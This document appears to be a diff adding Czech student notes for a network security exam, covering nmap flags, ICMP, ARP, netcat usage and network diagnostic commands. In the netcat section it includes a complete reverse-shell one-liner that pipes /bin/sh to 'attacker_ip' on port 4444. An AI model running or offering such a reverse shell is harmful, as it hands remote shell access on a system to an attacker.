@@ -1,0 +1,124 @@
+{\rtf1\ansi\ansicpg1250\cocoartf2709
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 TimesNewRomanPS-ItalicMT;\f1\froman\fcharset0 TimesNewRomanPSMT;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww25400\viewh13140\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\qc\partightenfactor0
+
+\f0\i\fs20 \cf0 KBB - maturita l\'e9ta p\'e1n\uc0\u283  2045 - NOJONO\
+
+\fs36 \
+Pr\uc0\u367 zkum a diagnostika s\'edt\u283 \
+\
+\
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f1\i0\fs26 \cf0 SKENOV\'c1N\'cd S\'cdT\uc0\u282  (NMAP)\
+\
+\'97 z\'e1kladn\'ed p\uc0\u345 ep\'edna\u269 e\
+	
+\f0\i -sn \'97> deaktivuje skenov\'e1n\'ed port\uc0\u367 \
+	-v \'97> verbose\
+	-sV \'97> skenuje otev\uc0\u345 en\'e9 porty (service a version info)\
+	-p \'97> 23452 specifick\'fd port (\'97script=banner \'97> pokud na portu b\uc0\u283 \'9e\'ed nestandartn\'ed service), -p- \'97> v\'9aechny, -p 1-234 \'97> range\
+	-F \'97> fast scan\
+	-O \'97> opera\uc0\u269 n\'ed sys.\
+	-Pn \'97> skip host discovery (ICMP ping)\
+	-sU \'97> UDP (-sS TCP \'97 default)\
+	-
+\f1\i0 \
+\
+\'97 
+\f0\i nmap 192.168.1.0/24
+\f1\i0  \'97 sken cel\'e9 s\'edt\uc0\u283 , vrac\'ed reporty pro aktivn\'ed za\u345 \'edzen\'ed\
+\'97 pokro\uc0\u269 il\'e9 skenov\'e1n\'ed\
+	
+\f0\i -A \'97> agresivn\'ed sken\
+	-sN / -sF \'97 >TCP NULL / TCP FIN\
+	\'97script \'97> nap\uc0\u345 .: vuln
+\f1\i0 \
+\
+TESTOV\'c1N\'cd KONEKTIVITY\
+\
+\'97 ICMP \'97 Internet Control Message Protocol\
+\'97 chybov\'e9 zpr\'e1vy o nedostupnosti slu\'9eby, za\uc0\u345 \'edzen\'ed, TTL (Time to live exceeded)\
+\'97 RTT \'97 round trip time \'97 \uc0\u269 as, za kter\'fd packet doraz\'ed do c\'edle a zp\u283 t\
+\
+\'97 ARP\
+	\'97 \'85\
+	\'97 komunikace ve stejn\'e9 pods\'edti \'97> je t\uc0\u345 eba p\u345 \'edmo zn\'e1t MAC adresu s\'ed\u357 ov\'e9ho rozhran\'ed\
+	\'97 ARP request \'97 hledan\'e1 IP adresa, informace o odes\'edlateli \'97> broadcast\
+\
+\'97 MAC \'97 Media Access Control\
+	\'97 48b\
+	\'97 v\'fdrobce za\uc0\u345 \'edzen\'ed / id za\u345 \'edzen\'ed\
+\
+\'97 zji\'9at\uc0\u283 n\'ed MAC adres za\u345 \'edzen\'ed v lok\'e1ln\'ed s\'edti \'97 
+\f0\i ping
+\f1\i0  \'97> 
+\f0\i arp -a (mac, na linuxu mo\'9en\'e1 sta\uc0\u269 \'ed arp)
+\f1\i0 \
+\
+\'97 ping \'97 Echo Request, Echo Reply\
+\
+NETCAT\
+\
+\'97 
+\f0\i arbitrary TCP and UDP connections and listens
+\f1\i0 \
+\'97 
+\f0\i nc [options] [host] [port]
+\f1\i0 \
+\
+\'97 basics \'9aak\
+	\
+	
+\f0\i nc -l  -p 5476 (server)\
+	nc 129.121.12.3 5476 (klient)\
+	\
+	-w X (po\uc0\u269 k\'e1 x sekund, pot\'e9 neaktivn\'ed spojen\'ed ukon\u269 \'ed)\
+\
+	
+\f1\i0 <> 
+\f0\i file redirect\
+	-v verbose\
+\
+	-c [command] (nebo -e, modern\'ed implementace tento option nemaj\'ed kv\uc0\u367 li bezpe\u269 nosti \'97> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f )\
+	-u UDP\
+	-k v\'edce p\uc0\u345 ipojen\'ed\
+\
+	echo -n "GET / HTTP/1.0\\r\\n\\r\\n" | nc example.com 80\
+\
+
+\f1\i0 	
+\f0\i -z sken portu (range x-y)
+\f1\i0 \
+\
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\i \cf0 	tar -czf - ./my_directory | nc -l 4444\
+\
+	
+\f1\i0 \
+\
+DIAGNOSTIKA S\'cd\uc0\u356 OV\'ddCH PROBL\'c9M\u366 \
+\
+\'97 komplexn\'ed problematika\
+\'97 postup od koncov\'fdch za\uc0\u345 \'edzen\'ed ven\
+\
+\'97 traceroute, ping\
+\'97 netstat -an\
+\'97 nslookup, dig\
+\'97 nc, nmap\
+\'97 /etc/resolv.conf\
+\'97 sudo iptables\
+\'97 ip route (add \'85)\
+\'97 tcpdump\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "https://www.youtube.com/watch?v=gGwsOpNOmr0"}}{\fldrslt 
+\f0\i \cf0 nefunguje internet \'97 p\uc0\u345 edn\'e1\'9aka}}
+\f0\i \
+}
